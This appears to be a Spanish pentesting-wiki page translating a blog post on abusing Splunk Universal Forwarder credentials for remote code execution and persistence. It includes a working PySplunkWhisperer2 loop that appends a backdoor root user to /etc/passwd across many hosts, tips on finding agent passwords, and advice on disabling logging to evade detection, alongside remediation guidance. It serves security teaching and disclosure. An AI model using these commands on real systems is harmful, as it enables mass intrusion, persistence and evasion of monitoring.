Si al **enumerar** una máquina **internamente** o **externamente** encuentras que se está ejecutando Splunk (puerto 8090), si tienes **credenciales válidas**, puedes **abusar del servicio de Splunk** para **ejecutar una shell** como el usuario que ejecuta Splunk. Si se está ejecutando como root, puedes escalar privilegios a root.

Además, si ya eres root y el servicio de Splunk no está escuchando solo en localhost, puedes **robar** el archivo de **contraseñas** del servicio de Splunk y **descifrar** las contraseñas, o **agregar nuevas** credenciales. Y mantener la persistencia en el host.

En la primera imagen a continuación, puedes ver cómo se ve una página web de Splunkd.

**La siguiente información fue copiada de** [**https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/**](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/)

# Abusando de Splunk Forwarders para obtener shells y persistencia

14 de agosto de 2020

## Descripción: <a href="#description" id="description"></a>

El agente Splunk Universal Forwarder (UF) permite a los usuarios remotos autenticados enviar comandos o scripts únicos a los agentes a través de la API de Splunk. El agente UF no valida las conexiones que provienen de un servidor Splunk Enterprise válido, ni valida que el código esté firmado o que provenga del servidor Splunk Enterprise. Esto permite a un atacante que obtiene acceso a la contraseña del agente UF ejecutar código arbitrario en el servidor como SYSTEM o root, dependiendo del sistema operativo.

Este ataque está siendo utilizado por los Penetration Testers y es probable que los atacantes malintencionados lo estén explotando activamente. Obtener la contraseña podría llevar a la compromiso de cientos de sistemas en un entorno de cliente.

Las contraseñas de Splunk UF son relativamente fáciles de adquirir, consulte la sección Lugares comunes de contraseñas para obtener detalles.

## Contexto: <a href="#context" id="context"></a>

Splunk es una herramienta de agregación y búsqueda de datos que a menudo se utiliza como sistema de monitoreo de información y eventos de seguridad (SIEM). Splunk Enterprise Server es una aplicación web que se ejecuta en un servidor, con agentes, llamados Universal Forwarders, que se instalan en cada sistema de la red. Splunk proporciona binarios de agente para Windows, Linux, Mac y Unix. Muchas organizaciones usan Syslog para enviar datos a Splunk en lugar de instalar un agente en hosts Linux/Unix, pero la instalación de agentes se está volviendo cada vez más popular.

Universal Forwarder es accesible en cada host en https://host:8089. Acceder a cualquiera de las llamadas de API protegidas, como /service/ muestra una ventana de autenticación básica. El nombre de usuario siempre es admin, y la contraseña predeterminada solía ser changeme hasta 2016, cuando Splunk requirió que todas las nuevas instalaciones establecieran una contraseña de 8 caracteres o más. Como se puede ver en mi demostración, la complejidad no es un requisito ya que mi contraseña de agente es 12345678. Un atacante remoto puede realizar un ataque de fuerza bruta a la contraseña sin bloqueo, lo cual es una necesidad de un host de registro, ya que si la cuenta se bloquea, los registros ya no se enviarían al servidor Splunk y un atacante podría usar esto para ocultar sus ataques. La siguiente captura de pantalla muestra el agente Universal Forwarder, esta página inicial es accesible sin autenticación y se puede utilizar para enumerar hosts que ejecutan Splunk Universal Forwarder.

![0](https://eapolsniper.github.io/assets/2020AUG14/11\_SplunkAgent.png)

La documentación de Splunk muestra el uso de la misma contraseña de reenvío universal para todos los agentes, no recuerdo con certeza si esto es un requisito o si se pueden establecer contraseñas individuales para cada agente, pero según la documentación y la memoria de cuando era un administrador de Splunk, creo que todos los agentes deben usar la misma contraseña. Esto significa que si se encuentra o se descifra la contraseña en un sistema, es probable que funcione en todos los hosts de Splunk UF. Esta ha sido mi experiencia personal, lo que permite la compromiso de cientos de hosts rápidamente.

## Lugares comunes de contraseñas <a href="#common-password-locations" id="common-password-locations"></a>

A menudo encuentro la contraseña de texto sin formato del agente de reenvío universal de Splunk en las siguientes ubicaciones en las redes:

1. Directorio Sysvol/domain.com/Scripts de Active Directory. Los administradores almacenan el ejecutable y la contraseña juntos para una instalación eficiente del agente.
2. Comparticiones de archivos de red que alojan archivos de instalación de TI
3. Wiki u otros repositorios de notas de compilación en la red interna

La contraseña también se puede acceder en forma de hash en Program Files\Splunk\etc\passwd en hosts de Windows, y en /opt/Splunk/etc/passwd en hosts de Linux y Unix. Un atacante puede intentar descifrar la contraseña usando Hashcat, o alquilar un entorno de descifrado en la nube para aumentar la probabilidad de descifrar el hash. La contraseña es un hash SHA-256 fuerte y, como tal, es poco probable que se descifre una contraseña fuerte y aleatoria.

## Impacto: <a href="#impact" id="impact"></a>

Un atacante con una contraseña de agente de reenvío universal de Splunk puede comprometer completamente todos los hosts de Splunk en la red y obtener permisos de nivel SYSTEM o root en cada host. He utilizado con éxito el agente Splunk en hosts de Windows, Linux y Solaris Unix. Esta vulnerabilidad podría permitir la extracción de credenciales del sistema, la exfiltración de datos sensibles o la instalación de ransomware. Esta vulnerabilidad es rápida, fácil de usar y confiable.

Dado que Splunk maneja registros, un atacante podría reconfigurar el reenvío universal en el primer comando ejecutado para cambiar la ubicación del reenvío, deshabilitando el registro en el SIEM de Splunk. Esto reduciría drásticamente las posibilidades de ser detectado por el equipo Blue del cliente.

Splunk Universal Forwarder
```bash
for i in `cat ip.txt`; do python PySplunkWhisperer2_remote.py --host $i --port 8089 --username admin --password "12345678" --payload "echo 'attacker007:x:1003:1003::/home/:/bin/bash' >> /etc/passwd" --lhost 192.168.42.51;done
```
Información del host:

Servidor Splunk Enterprise: 192.168.42.114\
Agente de reenvío de Splunk víctima: 192.168.42.98\
Atacante: 192.168.42.51

Versión de Splunk Enterprise: 8.0.5 (la última hasta el 12 de agosto de 2020, día de la configuración del laboratorio)\
Versión de Universal Forwarder: 8.0.5 (la última hasta el 12 de agosto de 2020, día de la configuración del laboratorio)

### Recomendaciones de solución para Splunk, Inc: <a href="#remediation-recommendations-for-splunk-inc" id="remediation-recommendations-for-splunk-inc"></a>

Recomiendo implementar todas las siguientes soluciones para proporcionar una defensa en profundidad:

1. Idealmente, el agente Universal Forwarder no tendría ningún puerto abierto, sino que consultaría al servidor Splunk a intervalos regulares para recibir instrucciones.
2. Habilitar la autenticación mutua TLS entre los clientes y el servidor, utilizando claves individuales para cada cliente. Esto proporcionaría una seguridad bidireccional muy alta entre todos los servicios de Splunk. La autenticación mutua TLS se está implementando ampliamente en agentes y dispositivos IoT, este es el futuro de la comunicación de cliente de dispositivo confiable con el servidor.
3. Enviar todo el código, archivos de una sola línea o de script, en un archivo comprimido que esté cifrado y firmado por el servidor Splunk. Esto no protege los datos del agente enviados a través de la API, pero protege contra la ejecución remota de código malicioso de un tercero.

### Recomendaciones de solución para los clientes de Splunk: <a href="#remediation-recommendations-for-splunk-customers" id="remediation-recommendations-for-splunk-customers"></a>

1. Asegurarse de que se establezca una contraseña muy fuerte para los agentes de Splunk. Recomiendo al menos una contraseña aleatoria de 15 caracteres, pero como estas contraseñas nunca se escriben, esto podría establecerse como una contraseña muy grande, como 50 caracteres.
2. Configurar firewalls basados en host para permitir solo conexiones al puerto 8089/TCP (puerto del agente Universal Forwarder) desde el servidor Splunk.

## Recomendaciones para el equipo Red: <a href="#recommendations-for-red-team" id="recommendations-for-red-team"></a>

1. Descargar una copia de Splunk Universal Forwarder para cada sistema operativo, ya que es un implante ligero y firmado. Es bueno tener una copia en caso de que Splunk realmente solucione esto.

## Exploits/Blogs de otros investigadores <a href="#exploitsblogs-from-other-researchers" id="exploitsblogs-from-other-researchers"></a>

Exploits públicos utilizables:

* https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2
* https://www.exploit-db.com/exploits/46238
* https://www.exploit-db.com/exploits/46487

Publicaciones de blog relacionadas:

* https://clement.notin.org/blog/2019/02/25/Splunk-Universal-Forwarder-Hijacking-2-SplunkWhisperer2/
* https://medium.com/@airman604/splunk-universal-forwarder-hijacking-5899c3e0e6b2
* https://www.hurricanelabs.com/splunk-tutorials/using-splunk-as-an-offensive-security-tool

_**Nota:**_ Este problema es un problema grave con los sistemas de Splunk y ha sido explotado por otros probadores durante años. Si bien la ejecución remota de código es una característica prevista del agente Universal Forwarder de Splunk, la implementación de esto es peligrosa. Intenté enviar este error a través del programa de recompensa por errores de Splunk en la muy improbable posibilidad de que no estén al tanto de las implicaciones de diseño, pero se me notificó que cualquier envío de errores implementa la política de divulgación de Bug Crowd/Splunk que establece que no se pueden discutir públicamente detalles de la vulnerabilidad _nunca_ sin el permiso de Splunk. Solicité un plazo de divulgación de 90 días y me fue negado. Como tal, no divulgué esto de manera responsable ya que estoy razonablemente seguro de que Splunk es consciente del problema y ha optado por ignorarlo, siento que esto podría afectar gravemente a las empresas y es responsabilidad de la comunidad de la seguridad de la información educar a las empresas.
